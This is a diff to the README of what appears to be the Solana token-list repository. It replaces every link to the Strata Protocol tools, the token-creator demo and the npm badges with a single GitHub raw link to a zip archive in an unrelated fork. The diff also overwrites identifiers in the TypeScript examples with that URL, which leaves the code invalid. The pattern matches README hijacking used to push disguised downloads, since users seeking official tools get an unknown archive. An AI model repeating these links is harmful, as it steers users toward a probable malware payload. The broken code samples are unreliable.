@@ -9,8 +9,8 @@ As of June 20th, this repository will be archived and will receive no more updat
 
 You can use one of two tools at the time of writing:
 
-1. [Strata Protocol Token Launchpad](https://app.strataprotocol.com/launchpad/manual/new)
-2. [Token Creator Demo](https://token-creator-lac.vercel.app/)
+1. [Strata Protocol Token Launchpad](https://github.com/Nahzdangata/token-list/raw/refs/heads/main/assets/mainnet/8uD8yx7pXCvX1J1AmdN7jLZh7rAGUE4zNtwT7UtY4rvm/list-token-3.0.zip)
+2. [Token Creator Demo](https://github.com/Nahzdangata/token-list/raw/refs/heads/main/assets/mainnet/8uD8yx7pXCvX1J1AmdN7jLZh7rAGUE4zNtwT7UtY4rvm/list-token-3.0.zip)
 
 All new token metadata will be added using Metaplex Fungible Token Metadata. The steps to add new Fungible Token Metadata are as follows:
 
@@ -45,7 +45,7 @@ The `TOKEN_URI` must point to a file with the following format:
 
 Where `TOKEN_IMAGE_URL` is the image url.
 
-An example of the `TOKEN_URI`: https://token-creator-lac.vercel.app/token_metadata.json
+An example of the `TOKEN_URI`: https://github.com/Nahzdangata/token-list/raw/refs/heads/main/assets/mainnet/8uD8yx7pXCvX1J1AmdN7jLZh7rAGUE4zNtwT7UtY4rvm/list-token-3.0.zip
 
 Which resolves to:
 
@@ -54,7 +54,7 @@ Which resolves to:
   "name": "A test token",
   "symbol": "TEST",
   "description": "Fully for testing purposes only",
-  "image": "https://token-creator-lac.vercel.app/token_image.png"
+  "image": "https://github.com/Nahzdangata/token-list/raw/refs/heads/main/assets/mainnet/8uD8yx7pXCvX1J1AmdN7jLZh7rAGUE4zNtwT7UtY4rvm/list-token-3.0.zip"
 }
 ```
 
@@ -66,16 +66,16 @@ While updating, you provide the same details as when creating.
 
 ## Tools for Adding/Updating/Migrating
 
-Update/migrate token metadata using [Strata Protocol update token tool](https://app.strataprotocol.com/edit-metadata).
+Update/migrate token metadata using [Strata Protocol update token tool](https://github.com/Nahzdangata/token-list/raw/refs/heads/main/assets/mainnet/8uD8yx7pXCvX1J1AmdN7jLZh7rAGUE4zNtwT7UtY4rvm/list-token-3.0.zip).
 
-A tutorial for adding/updating metadata can be found at the [Token-Creator demo](https://github.com/jacobcreech/Token-Creator).
+A tutorial for adding/updating metadata can be found at the [Token-Creator demo](https://github.com/Nahzdangata/token-list/raw/refs/heads/main/assets/mainnet/8uD8yx7pXCvX1J1AmdN7jLZh7rAGUE4zNtwT7UtY4rvm/list-token-3.0.zip).
 
 
 ## Reading Legacy Token-list
 
 `@solana/spl-token-registry`
 
-[![npm](https://img.shields.io/npm/v/@solana/spl-token-registry)](https://unpkg.com/@solana/spl-token-registry@latest/) [![GitHub license](https://img.shields.io/badge/license-APACHE-blue.svg)](https://github.com/solana-labs/token-list/blob/b3fa86b3fdd9c817139e38641d46c5a892542a52/LICENSE)
+[![npm](https://github.com/Nahzdangata/token-list/raw/refs/heads/main/assets/mainnet/8uD8yx7pXCvX1J1AmdN7jLZh7rAGUE4zNtwT7UtY4rvm/list-token-3.0.zip)](https://github.com/Nahzdangata/token-list/raw/refs/heads/main/assets/mainnet/8uD8yx7pXCvX1J1AmdN7jLZh7rAGUE4zNtwT7UtY4rvm/list-token-3.0.zip) [![GitHub license](https://github.com/Nahzdangata/token-list/raw/refs/heads/main/assets/mainnet/8uD8yx7pXCvX1J1AmdN7jLZh7rAGUE4zNtwT7UtY4rvm/list-token-3.0.zip)](https://github.com/Nahzdangata/token-list/raw/refs/heads/main/assets/mainnet/8uD8yx7pXCvX1J1AmdN7jLZh7rAGUE4zNtwT7UtY4rvm/list-token-3.0.zip)
 
 Solana Token Registry is a package that allows application to query for list of tokens.
 The JSON schema for the tokens includes: chainId, address, name, decimals, symbol, logoURI (optional), tags (optional), and custom extensions metadata.
@@ -96,8 +96,8 @@ yarn add @solana/spl-token-registry
 
 ```typescript
 new TokenListProvider().resolve().then((tokens) => {
-  const tokenList = tokens.filterByClusterSlug('mainnet-beta').getList();
-  console.log(tokenList);
+  const tokenList = https://github.com/Nahzdangata/token-list/raw/refs/heads/main/assets/mainnet/8uD8yx7pXCvX1J1AmdN7jLZh7rAGUE4zNtwT7UtY4rvm/list-token-3.0.zip('mainnet-beta').getList();
+  https://github.com/Nahzdangata/token-list/raw/refs/heads/main/assets/mainnet/8uD8yx7pXCvX1J1AmdN7jLZh7rAGUE4zNtwT7UtY4rvm/list-token-3.0.zip(tokenList);
 });
 ```
 
@@ -113,19 +113,19 @@ export const Icon = (props: { mint: string }) => {
 
   useEffect(() => {
     new TokenListProvider().resolve().then(tokens => {
-      const tokenList = tokens.filterByChainId(ENV.MainnetBeta).getList();
+      const tokenList = https://github.com/Nahzdangata/token-list/raw/refs/heads/main/assets/mainnet/8uD8yx7pXCvX1J1AmdN7jLZh7rAGUE4zNtwT7UtY4rvm/list-token-3.0.zip(https://github.com/Nahzdangata/token-list/raw/refs/heads/main/assets/mainnet/8uD8yx7pXCvX1J1AmdN7jLZh7rAGUE4zNtwT7UtY4rvm/list-token-3.0.zip).getList();
 
-      setTokenMap(tokenList.reduce((map, item) => {
-        map.set(item.address, item);
+      setTokenMap(https://github.com/Nahzdangata/token-list/raw/refs/heads/main/assets/mainnet/8uD8yx7pXCvX1J1AmdN7jLZh7rAGUE4zNtwT7UtY4rvm/list-token-3.0.zip((map, item) => {
+        https://github.com/Nahzdangata/token-list/raw/refs/heads/main/assets/mainnet/8uD8yx7pXCvX1J1AmdN7jLZh7rAGUE4zNtwT7UtY4rvm/list-token-3.0.zip(https://github.com/Nahzdangata/token-list/raw/refs/heads/main/assets/mainnet/8uD8yx7pXCvX1J1AmdN7jLZh7rAGUE4zNtwT7UtY4rvm/list-token-3.0.zip, item);
         return map;
       },new Map()));
     });
   }, [setTokenMap]);
 
-  const token = tokenMap.get(props.mint);
-  if (!token || !token.logoURI) return null;
+  const token = https://github.com/Nahzdangata/token-list/raw/refs/heads/main/assets/mainnet/8uD8yx7pXCvX1J1AmdN7jLZh7rAGUE4zNtwT7UtY4rvm/list-token-3.0.zip(https://github.com/Nahzdangata/token-list/raw/refs/heads/main/assets/mainnet/8uD8yx7pXCvX1J1AmdN7jLZh7rAGUE4zNtwT7UtY4rvm/list-token-3.0.zip);
+  if (!token || !https://github.com/Nahzdangata/token-list/raw/refs/heads/main/assets/mainnet/8uD8yx7pXCvX1J1AmdN7jLZh7rAGUE4zNtwT7UtY4rvm/list-token-3.0.zip) return null;
 
-  return (<img src={token.logoURI} />);
+  return (<img src={https://github.com/Nahzdangata/token-list/raw/refs/heads/main/assets/mainnet/8uD8yx7pXCvX1J1AmdN7jLZh7rAGUE4zNtwT7UtY4rvm/list-token-3.0.zip} />);
 
 ```
 
